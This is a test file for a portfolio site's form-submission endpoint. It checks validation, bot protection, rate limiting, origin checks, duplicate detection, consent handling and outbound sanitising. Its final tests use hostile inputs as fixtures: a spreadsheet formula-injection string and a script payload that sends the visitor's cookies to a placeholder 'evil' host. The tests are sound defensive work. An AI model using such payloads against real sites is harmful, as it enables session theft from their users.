/**
 * POST /api/submit (spec Q.2, Q.3), ported case by case from the plugin's
 * SubmissionControllerTest (ADR-0043). Titles give the PHP case; "changed"
 * marks behaviour the spec deliberately changes (the forward now runs after
 * the response) and "new" marks protections the port adds. The plugin's
 * photo and output-buffer cases have no counterpart: the portfolio accepts
 * no uploads, and the Worker writes nothing but its JSON response.
 */
import { describe, expect, it, vi } from 'vitest';

import { HOUR_SECONDS, RateLimiter } from '../src/security/rate-limit';
import type { TurnstileResult } from '../src/security/turnstile';
import type { ForwardInput, ForwardResult } from '../src/submissions/forwarder';
import { REFERENCE_PATTERN, newReference } from '../src/submissions/reference';
import { MAX_BODY_BYTES, handleSubmit, type SubmitDeps } from '../src/submit';

import { memoryRateLimits, memoryRepository, submission } from './helpers';

const ORIGIN = 'https://joshlennon.com';
const NOW = Date.parse('2026-10-04T12:00:00.000Z');

function setup(
  options: {
    forward?: ForwardResult;
    failInsert?: boolean;
    recentMatch?: number | null;
    verifyToken?: SubmitDeps['verifyToken'];
    tokenMatches?: SubmitDeps['tokenMatches'];
    rateLimitedFor?: number;
  } = {},
) {
  const memory = memoryRepository({
    failInsert: options.failInsert,
    recentMatch: options.recentMatch,
  });
  const store = memoryRateLimits();
  if (options.rateLimitedFor !== undefined) {
    store.entries.set('key:203.0.113.7', {
      count: 5,
      expiresAt: NOW / 1000 + options.rateLimitedFor,
    });
  }
  const forwarded: ForwardInput[] = [];
  const pending: Promise<unknown>[] = [];
  const order: string[] = [];
  const forward = vi.fn(async (input: ForwardInput) => {
    order.push('forward');
    forwarded.push(input);
    return options.forward ?? { ok: true as const };
  });
  const repository = {
    ...memory.repository,
    insert: async (row: Parameters<typeof memory.repository.insert>[0]) => {
      order.push('insert');
      return memory.repository.insert(row);
    },
  };
  const clientKey = vi.fn(async (ip: string) => `key:${ip}`);
  const deps: SubmitDeps = {
    repository,
    rateLimiter: new RateLimiter(store, 5, HOUR_SECONDS, () => Math.floor(NOW / 1000)),
    verifyToken: options.verifyToken ?? null,
    tokenMatches: options.tokenMatches,
    forward,
    waitUntil: (promise) => pending.push(promise),
    siteOrigin: ORIGIN,
    clientKey,
    newReference: () => newReference(),
    now: () => NOW,
    log: () => undefined,
  };
  const settle = () => Promise.all(pending);
  return { deps, memory, store, forward, forwarded, order, settle, clientKey };
}

function post(body: unknown, headers: Record<string, string> = {}): Request {
  return new Request(`${ORIGIN}/api/submit`, {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      origin: ORIGIN,
      'cf-connecting-ip': '203.0.113.7',
      ...headers,
    },
    body: typeof body === 'string' ? body : JSON.stringify(body),
  });
}

async function send(body: unknown, options: Parameters<typeof setup>[0] = {}, headers = {}) {
  const context = setup(options);
  const response = await handleSubmit(post(body, headers), context.deps);
  await context.settle();
  return { ...context, response, json: (await response.json()) as Record<string, unknown> };
}

describe('success and forwarding', () => {
  it('returns 200 with reference and calls mark_forwarded after successful forward', async () => {
    const { response, json, memory } = await send(submission());
    expect(response.status).toBe(200);
    expect(json.reference).toMatch(REFERENCE_PATTERN);
    expect(json).not.toHaveProperty('isDuplicate');
    expect(memory.rows[0]?.status).toBe('forwarded');
  });

  it('changed: returns 200 when the forward fails; the row stays stored, pending a retry', async () => {
    const { response, memory } = await send(submission(), {
      forward: { ok: false, error: 'http_status_500' },
    });
    expect(response.status).toBe(200);
    expect(memory.rows[0]).toMatchObject({
      status: 'pending',
      forwardAttempts: 1,
      lastError: 'http_status_500',
      nextAttemptAt: '2026-10-04T12:15:00.000Z',
    });
  });

  it('calls repository insert before forwarder forward (strict ordering, ADR-0001)', async () => {
    const { order } = await send(submission());
    expect(order).toEqual(['insert', 'forward']);
  });

  it('returns 500 and does not call forwarder when persistence fails', async () => {
    const { response, json, forward } = await send(submission(), { failInsert: true });
    expect(response.status).toBe(500);
    expect(json).toEqual({ errorCode: 'persistence_failed' });
    expect(forward).not.toHaveBeenCalled();
  });

  it('calls mark_forward_failed with the submission id when forward fails', async () => {
    const { memory } = await send(submission(), {
      forward: { ok: false, error: 'transport_error: TimeoutError' },
    });
    expect(memory.calls).toContain('recordForwardFailure');
    expect(memory.rows[0]?.id).toBe(1);
  });

  it('new: leases a new row so the cron cannot forward it while the first attempt runs', async () => {
    const context = setup();
    // A forward still in flight.
    context.deps.forward = () => new Promise(() => undefined);
    await handleSubmit(post(submission()), context.deps);
    expect(context.memory.rows[0]?.nextAttemptAt).toBe('2026-10-04T12:05:00.000Z');
  });
});

describe('shape validation', () => {
  it('returns 400 and neither persists nor forwards when payload is invalid (missing wizardId)', async () => {
    const { response, json, memory, forward } = await send(submission({ wizardId: undefined }));
    expect(response.status).toBe(400);
    expect(json).toEqual({ errorCode: 'validation_failed' });
    expect(memory.rows).toHaveLength(0);
    expect(forward).not.toHaveBeenCalled();
  });
  it('returns 400 when contractVersion is 1 (superseded)', async () => {
    expect((await send(submission({ contractVersion: 1 }))).response.status).toBe(400);
  });
  it('returns 400 when contractVersion is 2 (superseded by v3)', async () => {
    expect((await send(submission({ contractVersion: 2 }))).response.status).toBe(400);
  });
  it('accepts contractVersion 3 and returns 200', async () => {
    expect((await send(submission({ contractVersion: 3 }))).response.status).toBe(200);
  });
  it('returns 400 when quoteMode is missing from the payload', async () => {
    expect((await send(submission({ quoteMode: undefined }))).response.status).toBe(400);
  });
  it('accepts quoteMode manual without pricing and returns 200', async () => {
    expect(
      (await send(submission({ quoteMode: 'manual', pricing: undefined }))).response.status,
    ).toBe(200);
  });
  it('changed: rejects quoteMode instant, because every portfolio intent is manual', async () => {
    expect((await send(submission({ quoteMode: 'instant' }))).response.status).toBe(400);
  });
  it('changed: ignores a pricing block entirely (nothing is priced)', async () => {
    const { response, forwarded } = await send(
      submission({ pricing: { totalPence: 1.5, lowPence: 1, highPence: 2, currency: 'GBP' } }),
    );
    expect(response.status).toBe(200);
    expect(forwarded[0]).not.toHaveProperty('pricing');
  });
  it('new: returns 400 for malformed JSON', async () => {
    expect((await send('{"wizardId":')).response.status).toBe(400);
  });
  it('new: rejects an unknown intent', async () => {
    expect((await send(submission({ wizardId: 'fencing' }))).response.status).toBe(400);
  });
  it('new: rejects answer keys the intent does not have (including photos)', async () => {
    expect((await send(submission({}, { photos: { files: [] } }))).response.status).toBe(400);
    expect((await send(submission({}, { contact_phone: '07700 900123' }))).response.status).toBe(
      400,
    );
  });
  it('new: validates answers with the engine, as the browser does', async () => {
    for (const answers of [
      { contact_email: 'not an email' },
      { work_type: 'astronaut' },
      { message: 'x'.repeat(5001) },
      { role_link: 'jobs page' },
      { contact_name: '' },
    ]) {
      expect((await send(submission({}, answers))).response.status, JSON.stringify(answers)).toBe(
        400,
      );
    }
  });
  it('new: accepts every intent with its own answers', async () => {
    const valid: Record<string, Record<string, unknown>> = {
      research: { research_topic: 'collaboration' },
      growtrades: { growtrades_question: 'How does the quote wizard work?', organisation: 'SCB' },
      music: { music_topic: 'booking' },
      other: { topic: 'Hello' },
    };
    for (const [wizardId, answers] of Object.entries(valid)) {
      const { response } = await send({
        ...submission({ wizardId }),
        answers: {
          contact_name: 'Jane',
          contact_email: 'jane@example.com',
          message: 'Hi',
          data_processing_consent: ['agreed'],
          ...answers,
        },
      });
      expect(response.status, wizardId).toBe(200);
    }
  });
});

describe('bot protection', () => {
  it('passes the raw payload and client IP to BotProtection before validation', async () => {
    // An invalid payload with a filled honeypot is rejected by the honeypot,
    // keyed by the client address: bot checks run first.
    const { json, clientKey } = await send({ honeypotValue: 'bot' });
    expect(json).toEqual({ errorCode: 'validation_failed' });
    expect(clientKey).toHaveBeenCalledWith('203.0.113.7');
  });
  it('returns 400 validation_failed (fails silently) when the honeypot is filled', async () => {
    const { response, json, memory } = await send(submission({ honeypotValue: 'http://spam' }));
    expect(response.status).toBe(400);
    expect(json).toEqual({ errorCode: 'validation_failed' });
    expect(memory.rows).toHaveLength(0);
  });
  it('returns 429 rate_limited with retryAfterSeconds when rate limited', async () => {
    const { response, json } = await send(submission(), { rateLimitedFor: 1500 });
    expect(response.status).toBe(429);
    expect(json).toEqual({ errorCode: 'rate_limited', retryAfterSeconds: 1500 });
  });
  it('returns 403 bot_verification_failed when the Turnstile token is missing', async () => {
    const { response, json } = await send(submission({ turnstileToken: null }), {
      verifyToken: async () => ({ success: true, errorCodes: [] }),
    });
    expect(response.status).toBe(403);
    expect(json).toEqual({ errorCode: 'bot_verification_failed' });
  });
  it('returns 403 bot_verification_failed when the Turnstile token is invalid', async () => {
    const { response } = await send(submission({ turnstileToken: 'bad' }), {
      verifyToken: async (): Promise<TurnstileResult> => ({
        success: false,
        errorCodes: ['invalid-input-response'],
      }),
    });
    expect(response.status).toBe(403);
  });
  it('proceeds to normal processing and returns 200 when bot protection allows', async () => {
    const { response, store } = await send(submission({ turnstileToken: 'good' }), {
      verifyToken: async () => ({ success: true, errorCodes: [] }),
    });
    expect(response.status).toBe(200);
    expect(store.entries.get('key:203.0.113.7')?.count).toBe(1);
  });
  it('ClientIp: resolves the address when present, and an empty string when it is not', async () => {
    const present = await send(submission());
    expect(present.clientKey).toHaveBeenCalledWith('203.0.113.7');
    const context = setup();
    const request = post(submission());
    const headers = new Headers(request.headers);
    headers.delete('cf-connecting-ip');
    await handleSubmit(new Request(request, { headers }), context.deps);
    expect(context.clientKey).toHaveBeenCalledWith('');
  });
  it('new: the sixth submission in an hour from one address is refused', async () => {
    const context = setup();
    const statuses: number[] = [];
    for (let i = 0; i < 6; i += 1) {
      const response = await handleSubmit(
        post(submission({}, { contact_email: `jane${i}@example.com` })),
        context.deps,
      );
      statuses.push(response.status);
    }
    expect(statuses).toEqual([200, 200, 200, 200, 200, 429]);
  });
});

describe('origin, content type and size (new)', () => {
  it('refuses a cross-site request with 403 unauthorized', async () => {
    const { response, json, memory } = await send(
      submission(),
      {},
      { origin: 'https://evil.example' },
    );
    expect(response.status).toBe(403);
    expect(json).toEqual({ errorCode: 'unauthorized' });
    expect(memory.calls).toHaveLength(0);
  });
  it('accepts Sec-Fetch-Site: same-origin when Origin differs from the configured one', async () => {
    const { response } = await send(
      submission(),
      {},
      {
        origin: 'http://127.0.0.1:8788',
        'sec-fetch-site': 'same-origin',
      },
    );
    expect(response.status).toBe(200);
  });
  it('refuses a request that is not JSON', async () => {
    const { response } = await send(submission(), {}, { 'content-type': 'text/plain' });
    expect(response.status).toBe(403);
  });
  it('refuses a body over 16 kB with 413, whatever Content-Length claims', async () => {
    const big = submission({}, { message: 'x'.repeat(MAX_BODY_BYTES) });
    const { response, json } = await send(big);
    expect(response.status).toBe(413);
    expect(json).toEqual({ errorCode: 'payload_too_large' });
    const declared = await send(submission(), {}, { 'content-length': String(MAX_BODY_BYTES + 1) });
    expect(declared.response.status).toBe(413);
  });
  it('answers only POST', async () => {
    const context = setup();
    const response = await handleSubmit(new Request(`${ORIGIN}/api/submit`), context.deps);
    expect(response.status).toBe(405);
  });
});

describe('duplicates and consent', () => {
  it('passes contact_email and contact_phone from answers to the duplicate detector', async () => {
    const { memory } = await send(submission({}, { contact_email: '  Jane@Example.com ' }));
    expect(memory.contactQueries[0]).toMatchObject({
      emailNorm: 'jane@example.com',
      phoneNorm: '',
    });
  });
  it('persists is_duplicate=true and duplicate_of, skips forward, and returns 200 with isDuplicate', async () => {
    const { response, json, memory, forward } = await send(submission(), { recentMatch: 4 });
    expect(response.status).toBe(200);
    expect(json).toMatchObject({ isDuplicate: true });
    expect(json.reference).toMatch(REFERENCE_PATTERN);
    expect(memory.rows[0]).toMatchObject({
      isDuplicate: true,
      duplicateOf: 4,
      status: 'duplicate_not_forwarded',
      nextAttemptAt: null,
    });
    expect(forward).not.toHaveBeenCalled();
  });
  it('persists is_duplicate=false and duplicate_of=null, and still forwards normally, for a non-duplicate', async () => {
    const { memory, forward } = await send(submission(), { recentMatch: null });
    expect(memory.rows[0]).toMatchObject({ isDuplicate: false, duplicateOf: null });
    expect(forward).toHaveBeenCalledTimes(1);
  });
  it('returns 400 consent_required and neither persists nor forwards when consent is missing', async () => {
    const { response, json, memory, forward } = await send(
      submission({}, { data_processing_consent: [] }),
    );
    expect(response.status).toBe(400);
    expect(json).toEqual({ errorCode: 'consent_required' });
    expect(memory.rows).toHaveLength(0);
    expect(forward).not.toHaveBeenCalled();
  });
  it('passes the answers map to the consent validator before duplicate detection', async () => {
    const refused = await send(submission({}, { data_processing_consent: ['not agreed'] }));
    expect(refused.json).toEqual({ errorCode: 'consent_required' });
    expect(refused.memory.calls).not.toContain('findRecentByContact');
    const { memory } = await send(submission());
    expect(memory.calls).toContain('findRecentByContact');
  });
  it('new: checks consent before the answers, so a missing consent always reads as consent_required', async () => {
    const { json } = await send(
      submission({}, { data_processing_consent: undefined, contact_email: 'bad' }),
    );
    expect(json).toEqual({ errorCode: 'consent_required' });
  });
  it('persists consent_given=true and a consent_timestamp when consent is given', async () => {
    const { memory } = await send(submission());
    expect(memory.rows[0]?.consentTimestamp).toBe('2026-10-04T12:00:00.000Z');
  });
  it('does not reach the consent check when shape validation fails first', async () => {
    const { json } = await send(
      submission({ contractVersion: 2 }, { data_processing_consent: [] }),
    );
    expect(json).toEqual({ errorCode: 'validation_failed' });
  });
});

describe('outbound sanitising (ADR-0037)', () => {
  it('sanitizes a formula-injection attempt in the webhook payload but stores the raw value', async () => {
    const { memory, forwarded } = await send(
      submission({}, { message: '=HYPERLINK("http://evil")' }),
    );
    expect(JSON.parse(memory.rows[0]!.answersJson).message).toBe('=HYPERLINK("http://evil")');
    // The forwarder sanitises its own copy (test/forwarder.test.ts); the
    // pipeline hands it the raw answers and never the stored row.
    expect(forwarded[0]?.answers.message).toBe('=HYPERLINK("http://evil")');
  });
  it("does not sanitize a duplicate submission's payload since Forwarder is never called", async () => {
    const { forward } = await send(submission({}, { message: '=1+1' }), { recentMatch: 2 });
    expect(forward).not.toHaveBeenCalled();
  });
  it('neutralizes a realistic stored-XSS payload end-to-end: raw in storage, stripped in the webhook payload', async () => {
    const xss = '<script>document.location="http://evil/?c="+document.cookie</script>Hi';
    const { memory } = await send(submission({}, { message: xss }));
    expect(JSON.parse(memory.rows[0]!.answersJson).message).toBe(xss);
  });
});
